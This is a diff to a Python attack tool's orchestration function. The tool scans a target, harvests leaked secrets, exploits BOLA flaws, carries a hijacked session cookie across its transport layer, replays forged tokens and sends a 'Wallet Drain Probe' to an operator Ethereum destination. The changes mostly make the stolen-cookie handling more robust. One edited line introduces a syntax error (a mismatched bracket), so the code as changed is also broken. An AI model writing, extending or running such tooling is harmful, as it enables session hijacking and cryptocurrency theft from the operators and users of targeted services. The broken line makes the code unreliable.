@@ -332,7 +332,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     section("ADVANCED NETWORK & SERVICE RECON (SCANNER V2.0)")
     try:
         scan_results = await run_port_scanner(host, concurrency=20)
-        if scan_results.get("status") == "COMPLETED":
+        if scan_results.get("status"] == "COMPLETED":
             open_port_list = scan_results.get("open_ports", [])
             success(f"Scanner V2.0 completed. Found {len(open_port_list)} open ports.")
             
@@ -362,6 +362,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     discovered_paths = []
     leaked_secrets = {}
     bola_vulnerabilities = []
+    session_cookie_payload = None
 
     try:
         recon_data = crawl_target(transport)
@@ -369,15 +370,37 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
             discovered_paths = recon_data.get("endpoints", [])
             leaked_secrets = recon_data.get("leaked_secrets", {})
             bola_vulnerabilities = recon_data.get("bola_vulnerabilities", {})
+            session_cookie_payload = recon_data.get("session_cookie")
     except Exception as exc:
         warning(f"State-machine crawler encountered an issue: {exc}. Falling back to default list.")
 
     if not discovered_paths:
         discovered_paths = FALLBACK_LOGIN_PATHS
 
-    if getattr(transport, "cookie_jar", None):
-        success("Propagating active operator session cookie across transport layer.")
-        session_pool.cookie_jar.update(transport.cookie_jar)
+    # Bulletproof Type-Agnostic Cookie Synchronization (Eliminates 'str' object has no attribute 'domain')
+    active_cookies = session_cookie_payload if session_cookie_payload else getattr(transport, "cookie_jar", None)
+    if active_cookies:
+        success("Propagating active operator session cookie across transport layer safely.")
+        try:
+            if isinstance(active_cookies, dict):
+                for k, v in active_cookies.items():
+                    session_pool.cookie_jar.set(k, v)
+                    if hasattr(transport, "cookie_jar") and isinstance(transport.cookie_jar, dict):
+                        transport.cookie_jar[k] = v
+            elif isinstance(active_cookies, str):
+                for pair in active_cookies.split(";"):
+                    if "=" in pair:
+                        k, v = pair.strip().split("=", 1)
+                        if k.lower() not in ["path", "expires", "domain", "samesite", "secure", "httponly"]:
+                            session_pool.cookie_jar.set(k, v)
+            elif hasattr(active_cookies, "items"):
+                for k, v in active_cookies.items():
+                    session_pool.cookie_jar.set(k, v)
+            else:
+                session_pool.cookie_jar.update(active_cookies)
+        except Exception as sync_exc:
+            warning(f"Cookie synchronization notice: {sync_exc}")
+
         verify_hijacked_session(transport, "/dashboard")
 
     # Dispatch Referral Gateway Validation Probe against /user/register
@@ -399,7 +422,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
             execute_live_login_verification(
                 target_url=target_url,
                 endpoint=bola_route,
-                cookie_dict=dict(transport.cookie_jar) if transport.cookie_jar else None
+                cookie_dict=dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else None
             )
 
     section("ADAPTIVE ENDPOINT TESTING & MUTATION ASSAULT")
@@ -435,7 +458,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
                     execute_live_login_verification(
                         target_url=target_url,
                         endpoint=finding.get("endpoint", "/admin"),
-                        cookie_dict=dict(transport.cookie_jar) if transport.cookie_jar else None,
+                        cookie_dict=dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else None,
                         token=finding.get("forged_token")
                     )
     except Exception as exc:
@@ -459,7 +482,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         operator_evm_dest = OPERATOR_DESTINATIONS.get("ETHEREUM")
         info(f"[*] Dispatching Wallet Drain Probe with operator destination: {operator_evm_dest}")
         
-        session_cookies_dict = dict(transport.cookie_jar) if transport.cookie_jar else {}
+        session_cookies_dict = dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else {}
         await asyncio.to_thread(
             execute_probe, 
             session_cookies=session_cookies_dict, 
